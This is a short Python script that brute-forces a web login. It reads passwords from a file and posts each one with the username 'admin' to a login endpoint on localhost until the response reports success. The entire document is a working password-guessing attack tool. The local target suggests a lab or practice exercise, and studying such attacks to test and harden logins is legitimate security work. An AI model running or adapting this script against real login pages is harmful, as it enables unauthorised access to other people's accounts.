import requests


# Open the file and read its lines
with open("passwords.txt", "r") as file:
    password_list = file.read().splitlines()  # Read each line and remove newline characters

# Print the list to confirm
print(password_list)

# URL of the login page
url = "http://127.0.0.1:5000/login"



# The username to brute force
username = "admin"

# Loop through the password list
for password in password_list:
    # Send a POST request to the login page
    response = requests.post(url, data={"username": username, "password": password})

    # Check if login was successful
    if "Login successful" in response.text:
        print(f"Success! Username: {username}, Password: {password}")
        break
    else:
        print(f"Failed attempt: {username}:{password}")
